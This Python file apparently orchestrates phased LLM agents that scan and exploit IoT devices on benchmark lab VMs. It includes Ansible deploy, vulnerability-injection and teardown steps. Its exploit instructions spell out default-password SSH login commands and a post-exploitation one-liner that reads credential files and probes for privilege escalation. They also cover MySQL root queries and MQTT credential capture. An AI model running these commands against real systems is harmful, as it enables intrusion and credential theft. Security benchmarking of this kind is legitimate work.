"""Pipeline orchestrator — executes agents in phase sequence."""
from __future__ import annotations

import json
import logging
import re
import subprocess
from collections.abc import Callable
from datetime import datetime
from pathlib import Path

import yaml

from src.agent.registry import AGENTS, AgentConfig
from src.agent.provider import LLMProvider
from src.agent.prompt_manager import load_prompt
from src.agent.cost_tracker import CostTracker
from src.agent.tools.graph_tools import (
    GRAPH_TOOLS,
    load_lab_context,
    get_attack_surface,
    get_risk_scores,
    get_device_info,
)
from src.agent.tools.recon_tools import RECON_TOOLS
from src.agent.tools.deliverable import DELIVERABLE_TOOLS, set_output_dir, _extract_json
from src.agent.tools.skill_tools import SKILL_TOOLS, get_skills_metadata, set_skill_filter
from src.agent.scanner import run_scanner
from src.agent.validators import VALIDATORS

log = logging.getLogger(__name__)
OUTPUT_DIR = Path("output/agent")

TOOL_GROUPS: dict[str, list[dict]] = {
    "graph": GRAPH_TOOLS,
    "recon": RECON_TOOLS,
    "deliverable": DELIVERABLE_TOOLS,
    "skill": SKILL_TOOLS,
}

# ---------------------------------------------------------------------------
# Phase 4 exploit micro-agents: category mapping & per-category instructions
# ---------------------------------------------------------------------------

EXPLOIT_CATEGORY_MAP: dict[str, str] = {
    "default_credentials": "credentials",
    "code_injection":      "injection",
    "insecure_update":     "injection",
    "no_auth":             "data_access",
    "data_exposure":       "data_access",
    "directory_listing":   "data_access",
    "insecure_protocol":   "data_access",
    "network_exposure":    "data_access",
}

# Config-only findings that pass through without an exploit agent
CONFIG_ONLY_TYPES: set[str] = {
    "weak_cipher", "missing_header", "info_disclosure", "terrapin",
    "version_leak", "known_cve",
}

EXPLOIT_INSTRUCTIONS: dict[str, str] = {
    "credentials": (
        "Test default credentials on this service.\n\n"
        "For SSH — try these pairs in order, stop at FIRST successful login:\n"
        "  1. ssh_login(\"sshpass -p admin ssh -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
        "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc admin@{ip} 'id'\")\n"
        "  2. ssh_login(\"sshpass -p root ssh -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
        "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc root@{ip} 'id'\")\n"
        "  3. ssh_login(\"sshpass -p ubnt ssh -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
        "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc ubnt@{ip} 'id'\")\n"
        "  4. ssh_login(\"sshpass -p raspberry ssh -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
        "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc pi@{ip} 'id'\")\n\n"
        "If ANY login succeeds (return_code=0), run a SINGLE post-exploitation command:\n"
        "  ssh_login(\"sshpass -p PASSWORD ssh -o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null -o KexAlgorithms=+diffie-hellman-group14-sha1 "
        "-o HostKeyAlgorithms=+ssh-rsa -o Ciphers=+aes128-cbc,aes192-cbc,aes256-cbc USER@{ip} "
        "'echo === IDENTITY === && id && "
        "echo === CREDENTIALS === && "
        "(cat /etc/iot/config.json 2>/dev/null || echo no-config) && "
        "(cat /home/*/.env 2>/dev/null || echo no-env) && "
        "echo === NETWORK === && "
        "(ip addr show 2>/dev/null || ifconfig 2>/dev/null) && "
        "echo === PRIVESC === && "
        "(sudo -l 2>/dev/null || echo no-sudo) && "
        "(find / -perm -4000 -type f 2>/dev/null | head -5 || echo no-suid)'\")\n\n"
        "For MySQL — try root with empty password:\n"
        "  mysql_query(host=\"{ip}\", user=\"root\", "
        "query=\"SHOW DATABASES; SELECT * FROM smartcity.users LIMIT 5;\")\n\n"
        "Report ALL data retrieved in data_extracted field."
    ),
    "data_access": (
        "Access the service and retrieve actual data to prove impact.\n\n"
        "IMPORTANT: The Phase 3 evidence already contains the exact URLs/paths to use. "
        "Read the evidence field and use those EXACT URLs — do NOT invent paths.\n\n"
        'For MQTT no_auth: mqtt_listen("{ip}", topic="#", count=10, timeout=8) '
        "— capture messages, extract credentials/keys\n"
        'For HTTP data_exposure: http_get(URL) using URLs from Phase 3 evidence. '
        "If evidence mentions /backup/file.sql, use http_get(\"http://{ip}/backup/file.sql\") — "
        "include the FULL path exactly as it appears.\n"
        'For HTTP directory_listing: http_get(base_url) first to confirm, then http_get(listed_file_url) '
        "for each file in the listing\n"
        'For Telnet: telnet_connect("echo quit | timeout 3 nc {ip} {port}") — show session\n'
        "For DB: mysql_query(host=\"{ip}\", user=\"root\", query=\"SHOW DATABASES;\") — show data\n"
        'For FTP: ftp_list("ftp://{ip}/") — show files\n\n'
        "If the URL from evidence returns 404, mark as EXPLOITED anyway if Phase 3 already "
        "captured the sensitive content — do NOT mark as FAILED when Phase 3 proved the exposure."
    ),
    "injection": (
        "Attempt code execution or unauthorized upload.\n"
        'For file upload: http_get("http://{ip}/uploads/") to check for uploaded files\n'
        'For firmware: http_get("http://{ip}/update") to test unsigned firmware access\n'
        "Report what is accessible and whether execution is possible."
    ),
}


class Pipeline:
    """Multi-phase agent pipeline with deliverable passing and cost tracking."""

    def __init__(
        self,
        provider: LLMProvider,
        dry_run: bool = False,
        phases: list[int] | None = None,
        scenario_id: int | str | None = None,
        auto_teardown: bool = True,
        max_cost_usd: float | None = None,
        phase_models: dict[int | str, str] | None = None,
        custom_config: dict | None = None,  # {architecture, posture, selected_packs, excluded_vulns}
    ):
        self.provider = provider
        self.dry_run = dry_run
        self.phases = phases
        self.scenario_id = scenario_id
        self.auto_teardown = auto_teardown
        self.max_cost_usd = max_cost_usd
        self.phase_models = phase_models or {}
        self.custom_config = custom_config
        self.tracker = CostTracker(model=provider.model)
        self.context: dict = {}

        # Create timestamped run directory
        timestamp = datetime.now().strftime("%Y-%m-%d_%H%M%S")
        self.run_dir = OUTPUT_DIR / timestamp
        self.run_dir.mkdir(parents=True, exist_ok=True)

        # Point deliverable tools and validators at this run dir
        set_output_dir(self.run_dir)
        import src.agent.validators as val_mod
        val_mod.OUTPUT_DIR = self.run_dir

    def run(
        self,
        stream_callback: Callable[[dict], None] | None = None,
        stop_event=None,
    ) -> dict[str, str]:
        """Execute the full pipeline. Returns {agent_name: status} dict.

        Args:
            stream_callback: Optional callback for real-time events.
                Event types: pipeline_start, phase_start, text_chunk, tool_call,
                tool_result, turn_done, phase_done, pipeline_done.
        """
        # Load lab context — scenario topology when benchmark active, physical lab otherwise
        if self.scenario_id is not None:
            from src.agent.tools.graph_tools import load_scenario_topology
            lab = load_scenario_topology(self.scenario_id)
        else:
            lab = load_lab_context()
        # target_subnet: benchmark network when a scenario is active, real lab otherwise
        target_subnet = "192.168.100.0/24" if self.scenario_id is not None else "192.168.88.0/24"
        self.context = {
            "device_count": str(lab["device_count"]),
            "link_count": str(lab["link_count"]),
            "cve_count": str(lab["cve_count"]),
            "top_risk": str(lab["top_risk"]),
            "target_subnet": target_subnet,
            "scenario_context": "",
        }

        print("Loading lab context...")
        print(
            f"  Devices: {lab['device_count']}, Links: {lab['link_count']}, "
            f"CVEs: {lab['cve_count']}, Top risk: {lab['top_risk']}"
        )

        if stream_callback:
            stream_callback({
                "type": "pipeline_start",
                "device_count": lab["device_count"],
                "link_count": lab["link_count"],
                "cve_count": lab["cve_count"],
                "top_risk": lab["top_risk"],
            })

        # Load benchmark scenario context if specified
        if self.scenario_id is not None:
            scenario_context = self._load_scenario_context(self.scenario_id)
            if scenario_context:
                self.context["scenario_context"] = scenario_context
                print(f"  Benchmark scenario: S{self.scenario_id} — {scenario_context.splitlines()[0]}")

            # Save scenario metadata for evaluator
            meta = {
                "scenario_id": self.scenario_id,
                "run_dir": str(self.run_dir),
                "model": getattr(self.provider, "model", None),
            }
            if self.custom_config:
                meta["custom_config"] = self.custom_config
            (self.run_dir / "scenario_meta.json").write_text(json.dumps(meta, indent=2))

            # Copy ground truth into run directory for traceability
            self._save_ground_truth()

            # Deploy benchmark VMs before starting the pipeline
            if not self.dry_run:
                deploy_ok = self._run_scenario_deploy(stream_callback)
                if not deploy_ok:
                    if stream_callback:
                        stream_callback({"type": "pipeline_done", "results": {}, "total_cost_usd": 0, "run_dir": str(self.run_dir)})
                    return {}

        # Get agents sorted by phase
        agents = sorted(AGENTS.values(), key=lambda a: a.phase)
        if self.phases:
            agents = [a for a in agents if a.phase in self.phases]

        results: dict[str, str] = {}

        for agent_config in agents:
            # Switch provider/model if specific model set for this phase
            phase_num = agent_config.phase
            # Handle keys from JSON as strings or ints
            target_model = self.phase_models.get(phase_num) or self.phase_models.get(str(phase_num))
            if target_model and target_model != self.provider.model:
                log.info("Switching to phase %d specific model: %s", phase_num, target_model)
                self.provider = LLMProvider(provider="openrouter", model=target_model)
                # Note: CostTracker maintains the previous phases, but we update the current model
                self.tracker.model = target_model

            # Honour stop request between phases
            if stop_event and stop_event.is_set():
                log.info("Pipeline stop requested — halting before phase %d", agent_config.phase)
                if stream_callback:
                    stream_callback({"type": "error", "message": "Pipeline arrêté par l'utilisateur"})
                break

            # Check prerequisites
            if not self._check_prerequisites(agent_config, results):
                log.warning("Skipping %s: prerequisites not met", agent_config.name)
                results[agent_config.name] = "skipped:prerequisites"
                continue

            # Check conditional execution
            if not self._check_conditional(agent_config):
                log.info(
                    "Skipping %s: conditional check failed (empty queue)",
                    agent_config.name,
                )
                results[agent_config.name] = "skipped:conditional"
                continue

            # Run the agent
            status = self._run_agent(agent_config, stream_callback)
            results[agent_config.name] = status

            # Enforce budget limit after each phase
            if self.max_cost_usd is not None and self.tracker.total_cost() >= self.max_cost_usd:
                log.warning(
                    "Budget limit reached ($%.4f >= $%.4f) — stopping pipeline",
                    self.tracker.total_cost(), self.max_cost_usd,
                )
                if stream_callback:
                    stream_callback({
                        "type": "error",
                        "message": f"Budget dépassé (${self.tracker.total_cost():.4f} ≥ ${self.max_cost_usd:.4f}) — pipeline arrêté",
                    })
                break

        # Print cost summary
        self.tracker.print_summary()

        # Save cost summary to run directory
        cost_path = self.run_dir / "cost_summary.json"
        cost_path.write_text(self.tracker.to_json(), encoding="utf-8")
        log.info("Cost summary saved to %s", cost_path)

        if stream_callback:
            stream_callback({
                "type": "pipeline_done",
                "results": results,
                "total_cost_usd": round(self.tracker.total_cost(), 4),
                "run_dir": str(self.run_dir),
            })

        # Ingest run findings into ChromaDB for episodic memory
        try:
            from src.agent.knowledge.ingest import ingest_run_findings
            ingested = ingest_run_findings(self.run_dir, self.provider.model)
            if ingested:
                log.info("Ingested %d findings into run_history", ingested)
        except Exception as e:
            log.warning("Run history ingestion failed (non-fatal): %s", e)

        # Auto-teardown benchmark VMs when a scenario was deployed
        if self.scenario_id is not None and self.auto_teardown and not self.dry_run:
            self._run_teardown(stream_callback)

        return results

    def _run_playbook(self, playbook: str, stream_callback, event_type_start: str, event_type_done: str, extra_msg: str = "") -> bool:
        """Run an Ansible playbook and return True on success."""
        repo_root = Path(__file__).resolve().parents[2]
        cmd = [
            "ansible-playbook",
            f"benchmarks/ansible/playbooks/{playbook}",
            "-i", "benchmarks/ansible/inventory.yml",
            "--vault-password-file", "/root/.vault_pass",
            "--extra-vars", f"scenario_id={self.scenario_id}",
        ]
        print(f"\n{'=' * 60}")
        print(f"ANSIBLE: {playbook} (scenario {self.scenario_id})")
        print(f"{'=' * 60}\n")

        if stream_callback:
            stream_callback({"type": event_type_start, "scenario_id": self.scenario_id, "playbook": playbook})

        try:
            import os
            env = os.environ.copy()
            env["LANG"] = "en_US.UTF-8"
            env["LC_ALL"] = "en_US.UTF-8"
            result = subprocess.run(cmd, cwd=str(repo_root), capture_output=True, text=True, timeout=600, env=env)
            success = result.returncode == 0
            output = (result.stdout + result.stderr)[-3000:]
            print(output)
        except subprocess.TimeoutExpired:
            success = False
            output = f"{playbook} timeout (600s)"
        except FileNotFoundError:
            success = False
            output = "ansible-playbook not found — deploy skipped"

        if stream_callback:
            stream_callback({"type": event_type_done, "scenario_id": self.scenario_id, "playbook": playbook, "success": success, "output": output})
        return success

    def _run_scenario_deploy(self, stream_callback: Callable[[dict], None] | None = None) -> bool:
        """Deploy and configure benchmark scenario VMs before pipeline starts."""
        # Pre-teardown any running scenario to avoid conflicts on shared network
        self._teardown_all_running_scenarios(stream_callback)

        # 03 — deploy VMs
        ok = self._run_playbook("03_deploy_scenario.yml", stream_callback, "deploy_start", "deploy_done")
        if not ok:
            log.error("Scenario deploy failed — aborting pipeline")
            return False
        # 04 — inject vulnerabilities
        ok = self._run_playbook("04_inject_vulns.yml", stream_callback, "inject_start", "inject_done")
        if not ok:
            log.warning("Vuln injection failed — continuing anyway")
        # 06 — verify all vulns are present before running LLM (non-blocking: warn only)
        ok_verify = self._run_playbook("06_verify.yml", stream_callback, "verify_start", "verify_done")
        if not ok_verify:
            log.warning("Vuln verification found missing vulns — pipeline will run with degraded ground truth coverage")
        return True

    def _teardown_all_running_scenarios(self, stream_callback: Callable[[dict], None] | None = None) -> None:
        """Teardown any currently running scenario before deploying a new one."""
        repo_root = Path(__file__).resolve().parents[2]
        # Load all scenario IDs dynamically from group_vars
        import yaml as _yaml
        all_yml = repo_root / "benchmarks/ansible/group_vars/all/main.yml"
        try:
            _all_data = _yaml.safe_load(all_yml.read_text())
            scenario_ids = [int(k) for k in _all_data.get("scenario_vmid_ranges", {}).keys()]
        except Exception:
            scenario_ids = list(range(1, 11))
        for sid in scenario_ids:
            if sid == self.scenario_id:
                continue  # Will be redeployed fresh
            # Check if any VM in this scenario's range exists
            try:
                data = _all_data
                base = data["scenario_vmid_ranges"].get(str(sid))
                if not base:
                    continue
            except Exception:
                continue
            check = subprocess.run(
                ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
                 "root@10.0.0.110", f"pct status {base} 2>/dev/null && echo EXISTS || true"],
                capture_output=True, text=True, timeout=10,
            )
            if "EXISTS" not in check.stdout:
                continue
            # Scenario is running — teardown
            log.info("Pre-teardown of running scenario S%d", sid)
            old_id = self.scenario_id
            self.scenario_id = sid
            self._run_teardown(stream_callback)
            self.scenario_id = old_id

    def _run_teardown(self, stream_callback: Callable[[dict], None] | None = None) -> None:
        """Run 99_teardown.yml to clean up benchmark VMs after pipeline completes."""
        print(f"\n{'=' * 60}")
        print(f"TEARDOWN: Suppression du scénario S{self.scenario_id}")
        print(f"{'=' * 60}\n")

        if stream_callback:
            stream_callback({
                "type": "teardown_start",
                "scenario_id": self.scenario_id,
            })

        repo_root = Path(__file__).resolve().parents[2]
        cmd = [
            "ansible-playbook",
            "benchmarks/ansible/playbooks/99_teardown.yml",
            "-i", "benchmarks/ansible/inventory.yml",
            "--vault-password-file", "/root/.vault_pass",
            "--extra-vars", f"scenario_id={self.scenario_id}",
        ]

        try:
            result = subprocess.run(
                cmd,
                cwd=str(repo_root),
                capture_output=True,
                text=True,
                timeout=300,
            )
            success = result.returncode == 0
            output = result.stdout[-2000:] if result.stdout else result.stderr[-2000:]
            print(output)
        except subprocess.TimeoutExpired:
            success = False
            output = "Teardown timeout (300s)"
            log.error("Teardown timeout for scenario %d", self.scenario_id)
        except FileNotFoundError:
            success = False
            output = "ansible-playbook not found — teardown skipped"
            log.warning("ansible-playbook not in PATH, skipping teardown")

        if stream_callback:
            stream_callback({
                "type": "teardown_done",
                "scenario_id": self.scenario_id,
                "success": success,
                "output": output,
            })

    def _save_ground_truth(self):
        """Copy or generate ground truth into the run directory for traceability and evaluation."""
        import shutil

        gt_dest = self.run_dir / "ground_truth.yaml"

        if self.custom_config:
            # Custom mode: generate GT dynamically from selected packs/vulns
            gt = self._generate_custom_gt()
            if gt:
                gt_dest.write_text(yaml.dump(gt, default_flow_style=False, allow_unicode=True, sort_keys=False))
                log.info("Custom ground truth generated: %d vulns", len(gt.get("vulnerabilities", [])))
                return

        # Preset mode: copy existing GT file
        gt_path = Path("benchmarks/ground_truth") / f"scenario_{self.scenario_id}.yaml"
        if gt_path.exists():
            shutil.copy2(gt_path, gt_dest)
            log.info("Ground truth copied to run dir: %s", gt_dest)

    def _generate_custom_gt(self) -> dict | None:
        """Generate a ground truth from custom config (architecture + selected packs + excluded vulns)."""
        if not self.custom_config:
            return None

        architecture = self.custom_config.get("architecture")
        selected_packs = self.custom_config.get("selected_packs", [])
        excluded_vulns = set(self.custom_config.get("excluded_vulns", []))

        # Load topology
        topo_path = Path("benchmarks/topologies") / f"{architecture}.yaml"
        if not topo_path.exists():
            log.warning("Topology not found: %s", topo_path)
            return None
        topology = yaml.safe_load(topo_path.read_text())

        sid = str(self.scenario_id or "custom")
        weights = {"critical": 4, "high": 3, "medium": 2, "low": 1}
        vulns = []
        vuln_counter = 1

        for pack_id in selected_packs:
            pack_path = Path("benchmarks/packs/definitions") / f"{pack_id}.yaml"
            if not pack_path.exists():
                continue
            pack = yaml.safe_load(pack_path.read_text())

            for svc in topology.get("services", []):
                role = svc["role"]
                pack_vulns = pack.get("vulnerabilities", {}).get(role, [])
                device_name = svc["name_template"].format(sid=sid)
                ip = svc["ip"]

                for vt in pack_vulns:
                    # Check scenario restriction
                    allowed = vt.get("scenarios")
                    if allowed and sid not in allowed:
                        continue

                    # Build vuln ID for exclusion check
                    vuln_id = f"{pack_id}__{role}__{(vt.get('title', '')).replace(' ', '_')[:40]}"
                    if vuln_id in excluded_vulns:
                        continue

                    vuln = {
                        "id": f"V{vuln_counter}",
                        "device": device_name,
                        "ip": ip,
                        "role": role,
                    }
                    for key, val in vt.items():
                        if key == "scenarios":
                            continue
                        elif key == "indicators":
                            vuln[key] = [ind.replace("{ip}", ip) for ind in val]
                        elif key == "verification":
                            vuln[key] = val.replace("{ip}", ip)
                        else:
                            vuln[key] = val
                    vulns.append(vuln)
                    vuln_counter += 1

            # Router vulns
            for vt in pack.get("vulnerabilities", {}).get("router", []):
                allowed = vt.get("scenarios")
                if allowed and sid not in allowed:
                    continue
                vuln_id = f"{pack_id}__router__{(vt.get('title', '')).replace(' ', '_')[:40]}"
                if vuln_id in excluded_vulns:
                    continue
                router = topology.get("router", {})
                vuln = {
                    "id": f"V{vuln_counter}",
                    "device": router.get("name_template", "router").format(sid=sid),
                    "ip": router.get("ip", "192.168.100.1"),
                    "role": "router",
                }
                for key, val in vt.items():
                    if key == "scenarios":
                        continue
                    elif key == "indicators":
                        vuln[key] = [ind.replace("{ip}", vuln["ip"]) for ind in val]
                    elif key == "verification":
                        vuln[key] = val.replace("{ip}", vuln["ip"])
                    else:
                        vuln[key] = val
                vulns.append(vuln)
                vuln_counter += 1

        max_score = sum(weights.get(v.get("severity", "low").lower(), 1) for v in vulns)

        return {
            "scenario_id": sid,
            "scenario_name": f"Custom — {architecture}",
            "difficulty": "custom",
            "vulnerabilities": vulns,
            "scoring": {
                "total_vulnerabilities": len(vulns),
                "weights": weights,
                "max_weighted_score": max_score,
            },
            "bonus_types": [],
        }

    def _load_scenario_context(self, scenario_id: int | str) -> str:
        """Load benchmark scenario IPs from ground_truth YAML and return a context string."""
        gt_path = Path("benchmarks/ground_truth") / f"scenario_{scenario_id}.yaml"
        if not gt_path.exists():
            log.warning("Scenario ground truth not found: %s", gt_path)
            return ""
        data = yaml.safe_load(gt_path.read_text())
        lines = [
            f"## Benchmark scenario S{scenario_id}: {data.get('scenario_name', '')}",
            f"Scan network: 192.168.100.0/24 (NOT 192.168.88.0/24 — that is the physical lab)",
            f"Gateway: 192.168.100.1 (OpenWrt router)",
            "Known target hosts (scan ALL of them):",
        ]
        router = data.get("topology", {}).get("router", {})
        if router:
            lines.append(f"  - {router.get('name', 'router')} ({router.get('ip', '192.168.100.1')}) — role: router")
        for svc in data.get("topology", {}).get("services", []):
            lines.append(f"  - {svc['name']} ({svc['ip']}) — role: {svc['role']}")
        return "\n".join(lines)

    @staticmethod
    def _strip_code_fences(text: str) -> str:
        """Strip markdown code fences (```json ... ```) from LLM fallback output."""
        text = text.strip()
        text = re.sub(r'^```(?:json)?\s*\n', '', text)
        text = re.sub(r'\n```\s*$', '', text)
        return text.strip()

    def _run_agent(self, config: AgentConfig, stream_callback: Callable[[dict], None] | None = None) -> str:
        """Run a single agent phase."""
        # Set skill filter for this phase (hard filtering)
        filter_tags = config.skill_filter.get("tags") if config.skill_filter else None
        set_skill_filter(filter_tags)

        tools = self._resolve_tools(config)

        # Build prompt variables
        variables = {**self.context}
        variables["previous_deliverables"] = self._list_previous_deliverables()
        variables["expected_deliverable"] = config.deliverable_file
        variables["available_skills"] = self._filter_skills(config)

        # Inject deliverable template if one exists
        template_path = Path(__file__).parent / "templates" / config.deliverable_file
        if template_path.exists():
            template = template_path.read_text(encoding="utf-8")
            template = template.replace("{{run_date}}", self.run_dir.name)
            template = template.replace("{{model}}", self.provider.model)
            variables["deliverable_template"] = template

        # Load and compose prompt
        system_prompt = load_prompt(config.prompt_template, variables)

        # Print header
        print(f"\n{'=' * 60}")
        print(f"PHASE {config.phase}: {config.name.upper()}")
        print(f"  {config.description}")
        print(f"  Tools: {config.tools}")
        print(f"  Deliverable: {config.deliverable_file}")
        print(f"{'=' * 60}\n")

        if stream_callback:
            stream_callback({
                "type": "phase_start",
                "phase": config.phase,
                "name": config.name,
                "description": getattr(config, "description", ""),
                "deliverable": config.deliverable_file,
            })

        # If this phase has device sub-agents, run scanner + LLM analysis (Phase 3a+3b)
        if config.has_device_agents:
            self._run_phase3(config, stream_callback)

        # If this phase uses deterministic aggregation, skip the LLM and merge directly
        if config.deterministic_aggregation:
            self._aggregate_device_vulns(config, stream_callback)
            validator_fn = VALIDATORS.get(config.validator, VALIDATORS["default"])
            valid, msg = validator_fn(config.deliverable_file)
            status = "completed" if valid else f"failed:{msg}"
            if valid:
                log.info("Phase %d deterministic aggregation validated: %s", config.phase, msg)
                print(f"  Deliverable validated: {config.deliverable_file}")
            else:
                log.error("Phase %d deterministic aggregation FAILED: %s", config.phase, msg)
                print(f"  Deliverable FAILED validation: {msg}")
            if stream_callback:
                stream_callback({
                    "type": "phase_done",
                    "phase": config.phase,
                    "name": config.name,
                    "status": status,
                    "deliverable": config.deliverable_file,
                    "cost_usd": 0,
                    "turns": 0,
                })
            return status

        # If this phase has exploit sub-agents, run them and skip the LLM aggregator
        if config.has_exploit_agents:
            self._run_exploit_agents(config, stream_callback)
            # Deterministic aggregation already wrote 04_exploitation.json
            validator_fn = VALIDATORS.get(config.validator, VALIDATORS["default"])
            valid, msg = validator_fn(config.deliverable_file)
            status = "completed" if valid else f"failed:{msg}"
            if valid:
                log.info("Phase %d exploit aggregation validated: %s", config.phase, msg)
                print(f"  Deliverable validated: {config.deliverable_file}")
            else:
                log.error("Phase %d exploit aggregation FAILED: %s", config.phase, msg)
                print(f"  Deliverable FAILED validation: {msg}")
            if stream_callback:
                stream_callback({
                    "type": "phase_done",
                    "phase": config.phase,
                    "name": config.name,
                    "status": status,
                    "deliverable": config.deliverable_file,
                    "cost_usd": 0,
                    "turns": 0,
                })
            return status

        # Run agent with cost tracking
        self.tracker.start_phase(config.name)
        result_text = self.provider.chat_with_tools(
            system_prompt=system_prompt,
            user_message=config.user_message,
            tools=tools,
            max_turns=config.max_turns,
            max_tokens=config.max_tokens,
            cost_tracker=self.tracker,
            stream_callback=stream_callback,
            required_tool="save_deliverable",
        )
        usage = self.tracker.end_phase()

        if usage:
            print(
                f"\n  Phase {config.phase} done: {usage.turns} turns, "
                f"${usage.cost_usd(self.tracker.model):.4f}"
            )

        # Fallback: if the LLM never called save_deliverable, save its last text output
        deliverable_path = self.run_dir / config.deliverable_file
        if not deliverable_path.exists() and result_text and result_text.strip():
            log.warning(
                "Phase %d: save_deliverable was never called — saving last LLM output as fallback",
                config.phase,
            )
            deliverable_path.write_text(self._strip_code_fences(result_text), encoding="utf-8")
            print(f"  Fallback save: {config.deliverable_file}")

        # Validate deliverable
        validator_fn = VALIDATORS.get(config.validator, VALIDATORS["default"])
        valid, msg = validator_fn(config.deliverable_file)

        status = "completed" if valid else f"failed:{msg}"

        if valid:
            log.info("Phase %d deliverable validated: %s", config.phase, msg)
            print(f"  Deliverable validated: {config.deliverable_file}")
        else:
            log.error("Phase %d deliverable FAILED: %s", config.phase, msg)
            print(f"  Deliverable FAILED validation: {msg}")
            print(f"  LLM final output: {result_text[:500]}")

            # Reflector retry for main agent
            log.warning("Phase %d: reflector retry — prompting for save_deliverable", config.phase)
            retry_msg = (
                f"Your deliverable '{config.deliverable_file}' is missing or invalid.\n"
                f"Validation error: {msg}\n\n"
                f"Based on all the tool calls you already made in this session, "
                f"call save_deliverable('{config.deliverable_file}', content) NOW with the complete content.\n"
                f"Do NOT run any more tools. Write and save the deliverable immediately."
            )
            if result_text and result_text.strip():
                retry_msg += f"\n\nYour last output was:\n{result_text[:2000]}"
            self.tracker.start_phase(f"reflector_{config.name}")
            self.provider.chat_with_tools(
                system_prompt=system_prompt,
                user_message=retry_msg,
                tools=tools,
                max_turns=5,
                max_tokens=config.max_tokens,
                cost_tracker=self.tracker,
                stream_callback=stream_callback,
                required_tool="save_deliverable",
            )
            self.tracker.end_phase()
            # Re-validate after reflector
            valid, msg = validator_fn(config.deliverable_file)
            status = "completed" if valid else f"failed:{msg}"
            if valid:
                log.info("Phase %d reflector validated: %s", config.phase, msg)
                print(f"  Reflector validated: {config.deliverable_file}")
            else:
                log.error("Phase %d reflector FAILED: %s", config.phase, msg)

        if stream_callback:
            stream_callback({
                "type": "phase_done",
                "phase": config.phase,
                "name": config.name,
                "status": status,
                "deliverable": config.deliverable_file,
                "cost_usd": round(usage.cost_usd(self.tracker.model), 4) if usage else 0,
                "turns": usage.turns if usage else 0,
            })

        return status

    def _run_device_agents(self, config: AgentConfig, stream_callback: Callable[[dict], None] | None = None) -> None:
        """Run per-device sub-agents in parallel before the aggregator phase."""
        from concurrent.futures import ThreadPoolExecutor

        # Get devices with services from the attack surface
        surface = json.loads(get_attack_surface())
        if isinstance(surface, dict):
            surface = surface.get("nodes", list(surface.values()) if surface else [])
        scores_raw = json.loads(get_risk_scores())
        if isinstance(scores_raw, list):
            scores_by_id = {s["device_id"]: s for s in scores_raw}
        else:
            scores_by_id = {}

        tools = self._resolve_tools(config)

        print(f"\n{'=' * 60}")
        print(f"PHASE {config.phase}: DEVICE SUB-AGENTS (PARALLEL)")
        print(f"  Launching {len(surface)} device-specific vulnerability agents")
        print(f"{'=' * 60}\n")

        available_skills = self._filter_skills(config)
        previous_deliverables = self._list_previous_deliverables()

        def _run_single_device(device):
            device_id = device["id"]
            device_ip = device.get("ip", "unknown")
            device_type = device.get("type", "unknown")
            services = device.get("services", [])
            score_info = scores_by_id.get(device_id, {})

            device_detail = json.loads(get_device_info(device_id))
            device_os = device_detail.get("os_version", device_detail.get("firmware", "unknown"))

            services_str = ", ".join(
                f"{s.get('name', 'unknown')}:{s.get('port', '?')}"
                + (f" v{s['version']}" if s.get("version") else "")
                for s in services
            )

            known_cves = str(score_info.get("cve_count", 0)) + " CVEs"
            risk_score = str(score_info.get("risk_score", 0.0))

            deliverable_file = f"03_device_{device_id}.json"

            variables = {**self.context}
            variables["previous_deliverables"] = previous_deliverables
            variables["expected_deliverable"] = deliverable_file
            variables["available_skills"] = available_skills
            device_role = device.get("role", device_type)
            variables["device_id"] = device_id
            variables["device_ip"] = device_ip
            variables["device_type"] = device_type
            variables["device_role"] = device_role
            variables["device_services"] = services_str
            variables["device_os"] = device_os
            variables["device_risk_score"] = risk_score
            variables["device_known_cves"] = known_cves

            system_prompt = load_prompt("vuln_device", variables)
            phase_name = f"vuln_{device_id}"

            print(f"  [+] Starting: {phase_name} ({device_ip})")
            if stream_callback:
                stream_callback({"type": "device_start", "device_id": device_id, "device_ip": device_ip, "phase": 3})

            self.tracker.start_phase(phase_name)
            result_text = self.provider.chat_with_tools(
                system_prompt=system_prompt,
                user_message=(
                    f"Analyze vulnerabilities for device {device_id} ({device_ip}). "
                    f"Services: {services_str}. "
                    f"MANDATORY: Your session ends ONLY when you call save_deliverable('{deliverable_file}', json_content). "
                    f"Do NOT finish with a text response — your final action MUST be the save_deliverable tool call."
                ),
                tools=tools,
                max_turns=config.max_turns,
                max_tokens=config.max_tokens,
                cost_tracker=self.tracker,
                stream_callback=stream_callback,
                required_tool="save_deliverable",
            )
            usage = self.tracker.end_phase()
            if usage:
                print(f"  [+] Done: {phase_name} in {usage.turns} turns")
            if stream_callback:
                stream_callback({"type": "device_done", "device_id": device_id, "device_ip": device_ip, "phase": 3, "turns": usage.turns if usage else 0})

            # Fallback: if the LLM never called save_deliverable, save its last text output
            _exj = _extract_json
            deliverable_path = self.run_dir / deliverable_file
            if not deliverable_path.exists() and result_text and result_text.strip():
                log.warning(
                    "Device %s: save_deliverable was never called — saving last LLM output as fallback",
                    device_id,
                )
                fallback_content = _exj(result_text) if deliverable_file.endswith(".json") else self._strip_code_fences(result_text)
                deliverable_path.write_text(fallback_content, encoding="utf-8")
                print(f"  Fallback save: {deliverable_file}")

            # Reflector retry: if file is still missing or invalid JSON, re-prompt once
            _needs_reflector = False
            if deliverable_path.exists():
                try:
                    json.loads(_exj(deliverable_path.read_text(encoding="utf-8")))
                except Exception:
                    _needs_reflector = True  # file exists but invalid JSON
            else:
                _needs_reflector = True  # file never saved

            if _needs_reflector:
                log.warning("Device %s: reflector retry (file missing or invalid JSON)", device_id)
                print(f"  [Reflector] Retrying {device_id} — deliverable missing or invalid")
                if stream_callback:
